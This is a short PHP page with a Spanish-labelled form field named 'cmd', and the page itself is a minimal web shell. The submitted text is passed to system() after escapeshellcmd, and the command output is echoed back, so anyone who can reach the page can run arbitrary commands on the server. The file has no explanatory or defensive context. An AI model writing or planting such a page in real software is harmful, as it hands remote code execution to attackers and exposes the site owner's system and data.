<!DOCTYPE php>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<form method="POST">
		<input type="text" name="cmd">
		<button type="submit">Enviar</button>		
	</form>

	<?php
		if ($_SERVER["REQUEST_METHOD"] === "POST") {
			if (!is_null($_POST["cmd"])) {
				$cmd = escapeshellcmd($_POST["cmd"]);
				echo $cmd;

				echo "<PRE>";
				$comando = system($cmd, $retorno);
				echo $retorno;
				echo "</PRE>";
			}
		}	
	?>
</body>
</html>
